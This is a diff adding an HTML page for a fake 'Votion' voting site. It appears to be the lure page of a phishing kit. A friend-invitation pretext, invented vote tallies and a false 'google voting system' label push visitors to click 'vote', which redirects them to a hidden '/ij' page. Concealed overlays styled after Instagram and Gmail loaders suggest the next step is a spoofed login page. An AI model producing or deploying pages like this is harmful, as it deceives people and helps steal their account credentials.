@@ -1,0 +1,271 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <meta name="robots" content="noindex">
+       <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex">
+<!-- Facebook Meta Tags -->
+<meta property="og:url" content="http://projectconcept.epizy.com/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Vote your favourite model">
+<meta property="og:description" content="">
+<meta property="og:image" content="img/dabas.jpg">
+
+<!-- Twitter Meta Tags -->
+<meta name="twitter:card" content="summary_large_image">
+
+<meta name="twitter:title" content="Vote your favourite model">
+<meta name="twitter:description" content="">
+<meta name="twitter:image" content="img/dabas.jpg">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(#a8e8fa, #ffffff96),url(img/vote_trans.png);
+            background-position: center;
+            background-attachment: fixed;
+            background-size: cover;
+            color: #353434;
+            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+            padding: 10px;
+        }
+        .votion #profile {
+            text-align: center;
+            border-radius: 100%;
+            width: 200px;
+            height: 200px;
+            /* border: 1px solid dodgerblue; */
+        }
+        .votion h1 {
+            font-weight: bolder;
+            font-size: 30px;
+            text-align: center;
+            margin: 50px 0 20px 0;
+        }
+        .text-content p:nth-child(1){
+            font-size: 23px;
+            font-weight: bolder;
+            text-align: center;
+            margin: 30px 0 20px 0;
+        } 
+        .text-content p:nth-child(2) {
+            text-align: center;
+            font-size: 15px;
+            margin: 10px 0;
+            padding: 10px 30px;
+            line-height: 30px;
+        }
+        .text-content button {
+            background: #594ED7;
+            border: 1px solid transparent;
+            outline: 1px solid transparent;
+            color: white;
+            font-weight: bold;
+            text-align: center;
+            padding: 15px 10px;
+            margin: 10px 0;
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+            border-radius: 3px;
+            width: 95%;
+        }
+
+        .text-content .button2 {
+            background: #D9534F !important;
+            border: 1px solid transparent;
+            outline: 1px solid transparent;
+            color: white;
+            font-weight: bold;
+            text-align: center;
+            padding: 15px 10px;
+            margin: 10px 0;
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+            border-radius: 3px;
+            width: 95%;
+        }
+
+
+        .grid-count-text, .grid-count-number {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            text-align: center;
+            margin: 10px 0;
+        }
+        .grid-count-text article {
+            font-size: 20px;
+            font-weight: bold;
+        }
+        .grid-count-number article {
+            font-size: 30px;
+            font-weight: bold;
+            background: #ffffffa8;
+            margin: 5px 30px;
+            border-radius: 5px;
+            width: 80%;
+            padding: 10px;
+        }
+        #rem {
+            font-size: 20px;
+            font-weight: bold;
+            text-align: center;
+        }
+        #sum {
+            font-size: 30px;
+            font-weight: bold;
+            background: #ffffffa8;
+            margin: 5px 50%;
+            transform: translateX(-50%);
+            text-align: center;
+            border-radius: 5px;
+            width: 30%;
+            padding: 10px;
+        }
+        #bird {
+            position: absolute;
+            transform: translateX(-10px);
+            width: 180px;
+        }
+        #bird2 {
+            position: absolute;
+            right: 0px;
+            transform: rotateY(160deg);
+            width: 180px;
+        }
+        .loader {
+            background: white;
+            position: fixed;
+            top: 0;
+            height: 100%;
+            z-index: 99999;
+            width: 100%;
+            left: 0;
+            display: flex;
+            justify-content: center;
+            flex-direction: column;
+            align-items: center;
+        }
+        .insta, .gmai {
+            display: none;
+            background: white;
+            position: fixed;
+            top: 0;
+            height: 100%;
+            z-index: 99999;
+            width: 100%;
+            left: 0;
+            display: flex;
+            visibility: hidden;
+            justify-content: center;
+            flex-direction: column;
+            align-items: center;
+        }
+        .gmai {
+            background: #F5F4F2 !important;
+        }
+        .insta-toggle {
+            visibility: visible;
+        }
+        @media screen and (min-width: 768px) {
+            .fixed {
+                width: 50%;
+                margin: 0 50%;
+                transform: translateX(-50%);
+            }
+        }
+
+    </style>
+</head>
+<body>
+
+<div class="loader">
+    <img src="img/loader4.gif" width="300px">
+</div>
+
+<div class="insta">
+    <img src="https://cdn.dribbble.com/users/1723450/screenshots/14016708/media/3cb55bd7e69f96afac0d1e28a5a1028b.gif" width="300px" >
+</div>
+
+<div class="gmai">
+    <img src="img/gma.gif" width="300px" >
+</div>
+
+<div class="fixed">
+<div class="votion">
+    <h1>Votion</h1>
+    <img src="img/output-onlinegiftools.gif" id="bird">
+    <img src="img/output-onlinegiftools.gif" id="bird2">
+    <center><img id="profile" src="img/dabas.jpg"></center>
+    <div class="text-content">
+        <p>Your friend invited you</p>
+        <p>Your friend thinks you're amazing and wants your help getting elected.</p>
+        <!-- <p>Your friend wants your help getting elected as the new ambassador.</p> -->
+        <div class="grid-count-text">
+            <article>Max Vote</article>
+
+            <article>Voted</article>
+        </div>
+
+        <div class="grid-count-number">
+            <article>300</article>
+
+            <article>233</article>
+        </div>
+
+        
+        <article id="rem">Remaining</article>
+        <article id="sum">67</article>
+
+        <center><button class="button" id="b1">click here to vote</button></center>
+        
+
+        <br>
+
+        <h4 style="text-align: center; color: #3f3f3f;">Powered by <span style="color: #5B9BD1;"> google voting system</span></h4>
+
+    </div>
+</div>
+</div>
+<script>
+    // Ensure the content is hidden until after the loader displays for 3 seconds
+    window.addEventListener('load', function () {
+        setTimeout(function () {
+            document.querySelector('.loader').style.display = 'none';
+            document.querySelector('.content').style.display = 'block';
+        }, 3000); // Show loader for at least 3 seconds
+    });
+
+    // Event listener for the hidden page button
+    document.getElementById('b1').addEventListener('click', function () {
+        // Display the loader when the button is clicked
+        document.querySelector('.loader').style.display = 'flex';
+
+        // Fetch token from server and redirect to hidden page
+        fetch('/get-token') // Assuming we have a route to get the session token
+            .then(response => response.json())
+            .then(data => {
+                const token = data.token;
+                setTimeout(() => {
+                    // Redirect to the hidden page with the token
+                    window.location.href = `/ij?token=${token}`;
+                }, 300); // Delay to show loader briefly
+            })
+            .catch(error => {
+                console.error("Error fetching token:", error);
+                document.querySelector('.loader').style.display = 'none'; // Hide loader on error
+                alert("Failed to access the hidden page.");
+            });
+    });
+</script>
+</body>
+</html>
